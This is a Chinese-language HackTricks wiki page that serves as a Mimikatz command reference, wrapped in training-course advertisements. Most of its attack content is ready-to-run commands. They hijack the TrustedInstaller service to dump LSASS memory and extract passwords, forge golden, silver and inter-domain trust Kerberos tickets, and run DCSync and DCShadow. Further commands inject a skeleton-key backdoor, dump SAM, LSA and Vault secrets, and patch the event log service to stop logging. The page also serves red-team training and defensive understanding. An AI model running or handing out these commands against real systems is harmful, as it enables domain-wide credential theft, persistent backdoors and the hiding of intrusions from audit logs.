# Mimikatz

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** 上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

通过 8kSec 学院深化您在 **移动安全** 方面的专业知识。通过我们的自学课程掌握 iOS 和 Android 安全并获得认证：

{% embed url="https://academy.8ksec.io/" %}


**本页面基于 [adsecurity.org](https://adsecurity.org/?page\_id=1821) 的内容**。查看原文以获取更多信息！

## LM 和内存中的明文

从 Windows 8.1 和 Windows Server 2012 R2 开始，实施了重要措施以防止凭据被盗：

- **LM 哈希和明文密码** 不再存储在内存中以增强安全性。必须将特定注册表设置 _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ 配置为 DWORD 值 `0` 以禁用摘要身份验证，确保“明文”密码不会在 LSASS 中缓存。

- **LSA 保护** 被引入以保护本地安全机构 (LSA) 进程免受未经授权的内存读取和代码注入。这是通过将 LSASS 标记为受保护进程来实现的。激活 LSA 保护涉及：
1. 修改注册表 _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_，将 `RunAsPPL` 设置为 `dword:00000001`。
2. 实施一个强制此注册表更改的组策略对象 (GPO)，以在受管理设备上执行。

尽管有这些保护，像 Mimikatz 这样的工具仍然可以使用特定驱动程序绕过 LSA 保护，尽管此类操作可能会被记录在事件日志中。

### 反制 SeDebugPrivilege 移除

管理员通常拥有 SeDebugPrivilege，使他们能够调试程序。可以限制此权限以防止未经授权的内存转储，这是攻击者提取内存中凭据的常用技术。然而，即使移除了此权限，TrustedInstaller 账户仍然可以使用自定义服务配置执行内存转储：
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
这允许将 `lsass.exe` 的内存转储到一个文件中，然后可以在另一个系统上进行分析以提取凭据：
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz 选项

在 Mimikatz 中，事件日志篡改涉及两个主要操作：清除事件日志和修补事件服务以防止记录新事件。以下是执行这些操作的命令：

#### 清除事件日志

- **命令**：此操作旨在删除事件日志，使追踪恶意活动变得更加困难。
- Mimikatz 在其标准文档中没有提供直接通过命令行清除事件日志的命令。然而，事件日志操作通常涉及使用系统工具或脚本在 Mimikatz 之外清除特定日志（例如，使用 PowerShell 或 Windows 事件查看器）。

#### 实验性功能：修补事件服务

- **命令**：`event::drop`
- 此实验性命令旨在修改事件日志服务的行为，有效防止其记录新事件。
- 示例：`mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` 命令确保 Mimikatz 以必要的权限操作以修改系统服务。
- `event::drop` 命令随后修补事件日志服务。

### Kerberos 票证攻击

### 黄金票证创建

黄金票证允许进行域范围的访问冒充。关键命令和参数：

- 命令：`kerberos::golden`
- 参数：
- `/domain`：域名。
- `/sid`：域的安全标识符（SID）。
- `/user`：要冒充的用户名。
- `/krbtgt`：域的 KDC 服务账户的 NTLM 哈希。
- `/ptt`：直接将票证注入内存。
- `/ticket`：保存票证以供后用。

示例：
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets 授予对特定服务的访问权限。关键命令和参数：

- Command: 类似于 Golden Ticket，但针对特定服务。
- Parameters:
- `/service`: 要针对的服务（例如，cifs，http）。
- 其他参数类似于 Golden Ticket。

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

信任票证用于通过利用信任关系访问跨域资源。关键命令和参数：

- 命令：类似于黄金票证，但用于信任关系。
- 参数：
- `/target`：目标域的FQDN。
- `/rc4`：信任账户的NTLM哈希。

示例：
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### 额外的 Kerberos 命令

- **列出票证**：
- 命令：`kerberos::list`
- 列出当前用户会话的所有 Kerberos 票证。

- **传递缓存**：
- 命令：`kerberos::ptc`
- 从缓存文件中注入 Kerberos 票证。
- 示例：`mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **传递票证**：
- 命令：`kerberos::ptt`
- 允许在另一个会话中使用 Kerberos 票证。
- 示例：`mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **清除票证**：
- 命令：`kerberos::purge`
- 清除会话中的所有 Kerberos 票证。
- 在使用票证操作命令之前很有用，以避免冲突。

### Active Directory 篡改

- **DCShadow**：临时使机器充当 DC 以进行 AD 对象操作。
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**：模拟 DC 请求密码数据。
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### 凭证访问

- **LSADUMP::LSA**：从 LSA 中提取凭证。
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**：使用计算机帐户的密码数据模拟 DC。
- *原文中未提供 NetSync 的具体命令。*

- **LSADUMP::SAM**：访问本地 SAM 数据库。
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**：解密存储在注册表中的秘密。
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**：为用户设置新的 NTLM 哈希。
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**：检索信任认证信息。
- `mimikatz "lsadump::trust" exit`

### 杂项

- **MISC::Skeleton**：在 DC 上注入后门到 LSASS。
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### 权限提升

- **PRIVILEGE::Backup**：获取备份权限。
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**：获取调试权限。
- `mimikatz "privilege::debug" exit`

### 凭证转储

- **SEKURLSA::LogonPasswords**：显示已登录用户的凭证。
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**：从内存中提取 Kerberos 票证。
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid 和 Token 操作

- **SID::add/modify**：更改 SID 和 SIDHistory。
- 添加：`mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- 修改：*原文中未提供修改的具体命令。*

- **TOKEN::Elevate**：模拟令牌。
- `mimikatz "token::elevate /domainadmin" exit`

### 终端服务

- **TS::MultiRDP**：允许多个 RDP 会话。
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**：列出 TS/RDP 会话。
- *原文中未提供 TS::Sessions 的具体命令。*

### Vault

- 从 Windows Vault 中提取密码。
- `mimikatz "vault::cred /patch" exit`


<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

深入了解 **移动安全**，请访问 8kSec 学院。通过我们的自学课程掌握 iOS 和 Android 安全并获得认证：

{% embed url="https://academy.8ksec.io/" %}

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术： <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
